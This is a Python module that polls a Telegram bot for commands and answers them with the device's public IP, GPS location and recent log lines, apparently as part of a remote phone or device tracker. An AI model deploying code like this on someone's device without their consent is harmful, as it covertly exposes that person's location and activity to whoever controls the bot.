import requests
from config import TG_TOKEN, TG_USER_ID
from modules import location

last_command = ""

def send_telegram(message):
    requests.post(
        f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
        data={"chat_id": TG_USER_ID, "text": message}
    )

def handle_commands():
    global last_command
    try:
        resp = requests.get(
            f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates"
        ).json()

        if not resp.get("ok"):
            return

        messages = resp["result"]
        if not messages:
            return

        last_msg = messages[-1]["message"]
        text = last_msg.get("text", "")
        msg_id = last_msg["message_id"]

        if text != last_command:
            last_command = text

            if text.lower() == "/ping":
                send_telegram("🏓 Pong!")
            elif text.lower() == "/ip":
                from modules.booster import get_ip
                send_telegram(f"🌐 IP: {get_ip()}")
            elif text.lower() == "/lokasi":
                lat, lon, acc = location.get_location()
                send_telegram(f"📍 Lokasi:\nLat: {lat}\nLon: {lon}\nAkurasi: {acc} m")
            elif text.lower() == "/log":
                from config import LOG_FILE
                with open(LOG_FILE, "r") as f:
                    data = f.read()[-300:]
                send_telegram(f"🗂 Log terakhir:\n{data}")
    except:
        pass
